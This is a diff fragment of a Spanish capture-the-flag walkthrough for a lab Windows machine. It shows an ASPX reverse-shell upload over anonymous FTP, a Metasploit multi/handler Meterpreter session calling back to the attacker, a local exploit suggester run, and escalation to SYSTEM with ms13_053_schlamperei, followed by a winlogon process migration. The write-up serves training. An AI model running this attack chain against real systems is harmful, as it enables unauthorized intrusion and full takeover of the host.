+ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:berserkwings): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> put shell.aspx
+local: shell.aspx remote: shell.aspx
+229 Entering Extended Passive Mode (|||49158|)
+125 Data connection already open; Transfer starting.
+100% |**********************************************************************************************************************************************************************************************|  2883       52.87 MiB/s    --:-- ETA
+226 Transfer complete.
+2883 bytes sent in 00:00 (40.69 KiB/s)
+ftp> dir
+229 Entering Extended Passive Mode (|||49159|)
+125 Data connection already open; Transfer starting.
+03-18-17  02:06AM       <DIR>          aspnet_client
+03-17-17  05:37PM                  689 iisstart.htm
+03-31-24  08:02AM                 2883 shell.aspx
+03-17-17  05:37PM               184946 welcome.png
+226 Transfer complete.
+ftp> exit
+221 Goodbye.
 ```
-Y listo, ya tenemos las flags de la máquina.
+
+* Entra en el **Metasploit Framework**, configura el **modulo multi/handler** para obtener una sesión en **meterpreter** y ejecuta el Payload cargado en la página web:
+```bash
+msfconsole
+.
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+.
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST Tu_IP
+LHOST => Tu_IP
+msf6 exploit(multi/handler) > set LPORT 4242
+LPORT => 4242
+msf6 exploit(multi/handler) > exploit
+.
+[*] Started reverse TCP handler on Tu_IP:4242 
+[*] Sending stage (175686 bytes) to 10.10.10.5
+[*] Meterpreter session 1 opened (Tu_IP:4242 -> 10.10.10.5:49160)
+.
+meterpreter >
+```
+
+<br>
+<h3 id="Suggester">Usando Modulo local_exploit_suggester</h3>
+
+Excelente, para este caso, vamos a usar un modulo que nos dara los Exploits a los que es posible que sea vulnerable la máquina víctima:
+```bash
+msf6 exploit(multi/handler) > search suggester
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+
+msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
+msf6 post(multi/recon/local_exploit_suggester) >
+```
+
+Cargamos la sesión que tenemos activa y ejecutamos el modulo:
+```bash
+msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
+SESSION => 1
+msf6 post(multi/recon/local_exploit_suggester) > exploit
+
+[*] 10.10.10.5 - Collecting local exploits for x86/windows...
+[*] 10.10.10.5 - 181 exploit checks are being tried...
+[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Running check method for exploit 41 / 41
+[*] 10.10.10.5 - Valid modules for session 1:
+============================
+
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
+ 3   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
+ 4   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 6   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 7   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
+ 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 9   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
+ 10  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
+ 11  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+ 12  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
+ 13  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
+```
+Obviamente no podemos usar todos los Exploits, debemos investigar cada uno para saber cual es el indicado para usar. Después de investigar, nos puede servir el **Exploit ms13_053_schlamperei**, así que vamos a usarlo.
+
+<br>
+<h3 id="MS13">Usando Exploit ms13_053_schlamperei</h3>
+
+* Cargamos el modulo:
+```bash
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms13_053_schlamperei
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms13_053_schlamperei) >
+```
+
+* Configuramos el modulo:
+```bash
+msf6 exploit(windows/local/ms13_053_schlamperei) > set SESSION 1
+SESSION => 1
+msf6 exploit(windows/local/ms13_053_schlamperei) > set LHOST Tu_IP
+LHOST => Tu_IP
+```
+
+* Y lo ejecutamos:
+```bash
+msf6 exploit(windows/local/ms13_053_schlamperei) > exploit
+
+[*] Started reverse TCP handler on Tu_IP:4444 
+[*] Launching notepad to host the exploit...
+[+] Process 4060 launched.
+[*] Reflectively injecting the exploit DLL into 4060...
+[*] Injecting exploit into 4060...
+[*] Found winlogon.exe with PID 440
+[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell
+[*] Sending stage (175686 bytes) to 10.10.10.5
+[*] Meterpreter session 2 opened (Tu_IP:4444 -> 10.10.10.5:49161)
+
+meterpreter > shell
+Process 1068 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+Con esto ya hemos ganado acceso como Administador.
+
+Es posible que falle y no se genere una sesión como Administrador, pero el modulo indicara que si funciono, entonces, si entras a la máquina puedes buscar el **proceso winlogon.exe** y migrar a este para ser Administrador.
+```bash
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name               Arch  Session  User                          Path
+ ---   ----  ----               ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System             x86   0
+ 236   4     smss.exe           x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 328   308   csrss.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 380   308   wininit.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 388   372   csrss.exe          x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 440   372   winlogon.exe       x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+.
+meterpreter > migrate 440
+```
+
+<h2 id="Exploit3">Utilizando Rotten Potato para Escalar Privilegios</h2>
 
 
 <br>
